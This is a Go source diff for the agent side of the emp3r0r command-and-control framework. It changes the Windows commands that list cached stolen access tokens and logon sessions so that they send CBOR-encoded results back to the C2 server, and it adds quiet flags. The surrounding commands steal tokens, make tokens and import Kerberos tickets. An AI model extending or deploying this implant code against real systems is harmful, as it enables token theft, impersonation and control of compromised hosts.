@@ -6,7 +6,9 @@ import (
 	"fmt"
 	"strconv"
 	"strings"
+	"time"
 
+	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/priv"
@@ -36,6 +38,7 @@ func platformCommands(cmd *cobra.Command) {
 		GroupID: "windows",
 		Run:     runListTokens,
 	}
+	listTokensCmd.Flags().BoolP("quiet", "q", false, "Suppress printing the result (used by command completion)")
 	cmd.AddCommand(listTokensCmd)
 
 	// !make_token
@@ -60,6 +63,7 @@ func platformCommands(cmd *cobra.Command) {
 		GroupID: "windows",
 		Run:     runListSessions,
 	}
+	listSessionsCmd.Flags().BoolP("quiet", "q", false, "Suppress printing the result (used by command completion)")
 	cmd.AddCommand(listSessionsCmd)
 
 	// !import_ticket
@@ -122,7 +126,7 @@ func runStealToken(cmd *cobra.Command, args []string) {
 }
 
 func runListTokens(cmd *cobra.Command, _ []string) {
-	var entries []string
+	entries := make([]def.TokenEntry, 0)
 	priv.TokenMap.Range(func(key, value any) bool {
 		sid, ok := key.(string)
 		if !ok {
@@ -130,29 +134,31 @@ func runListTokens(cmd *cobra.Command, _ []string) {
 		}
 		hToken, ok := value.(windows.Handle)
 		if !ok {
-			entries = append(entries, fmt.Sprintf("%s  <invalid handle>", sid))
+			entries = append(entries, def.TokenEntry{Key: sid, FriendlyName: "<invalid handle>"})
 			return true
 		}
-		friendly := priv.GetTokenFriendlyName(hToken)
 		// make_token sessions are stored in TokenMap under their session name
-		// so they can be used via the universal "token" option; annotate them.
-		if _, isSession := priv.GetSession(sid); isSession {
-			friendly += "  [make_token session]"
-		}
-		// Output key first so the CC-side completer can use it directly
-		entries = append(entries, fmt.Sprintf("%s  %s", sid, friendly))
+		// so they can be used via the universal "token" option; mark them.
+		_, isSession := priv.GetSession(sid)
+		entries = append(entries, def.TokenEntry{
+			Key:          sid,
+			FriendlyName: priv.GetTokenFriendlyName(hToken),
+			IsSession:    isSession,
+		})
 		return true
 	})
 
-	if len(entries) == 0 {
-		c2transport.NotifyC2(cmd, "No cached tokens (run: %s --pid <PID> or %s --user <USER>)\n", "!steal_token", "!make_token")
+	// Structured (CBOR) response so the CC can complete and render without
+	// parsing text; an empty list is sent as-is ("No cached tokens" is
+	// rendered CC-side from the length).
+	data, err := cbor.Marshal(entries)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Error marshaling tokens: %v\n", err)
 		return
 	}
-	c2transport.NotifyC2(cmd, "Cached tokens (%d):\n%s\n", len(entries), strings.Join(entries, "\n"))
+	c2transport.NotifyC2Binary(cmd, data)
 }
 
-// runMakeToken implements !make_token --user <user> [--domain <domain>]
-// [--password <dummy>] [--name <session>]
 func runMakeToken(cmd *cobra.Command, args []string) {
 	user, _ := cmd.Flags().GetString("user")
 	domain, _ := cmd.Flags().GetString("domain")
@@ -199,16 +205,30 @@ func runMakeToken(cmd *cobra.Command, args []string) {
 
 // runListSessions implements !list_sessions
 func runListSessions(cmd *cobra.Command, _ []string) {
-	entries := priv.ListSessions()
-	if len(entries) == 0 {
-		c2transport.NotifyC2(cmd, "No netlogon sessions (run: %s --user <USER>)\n", "!make_token")
+	entries := make([]def.SessionEntry, 0)
+	priv.SessionMap.Range(func(key, value any) bool {
+		session, ok := value.(*priv.LogonSession)
+		if !ok {
+			return true
+		}
+		entries = append(entries, def.SessionEntry{
+			Name:      session.Name,
+			User:      session.User,
+			Domain:    session.Domain,
+			LogonID:   session.LogonID,
+			CreatedAt: session.CreatedAt.Format(time.RFC3339),
+		})
+		return true
+	})
+
+	data, err := cbor.Marshal(entries)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Error marshaling sessions: %v\n", err)
 		return
 	}
-	c2transport.NotifyC2(cmd, "Netlogon sessions (%d):\n%s\n", len(entries), strings.Join(entries, "\n"))
+	c2transport.NotifyC2Binary(cmd, data)
 }
 
-// runImportTicket implements
-// !import_ticket --session <name> --ticket <base64> | --luid <hex> --ticket <base64>
 func runImportTicket(cmd *cobra.Command, args []string) {
 	sessionName, _ := cmd.Flags().GetString("session")
 	luidStr, _ := cmd.Flags().GetString("luid")
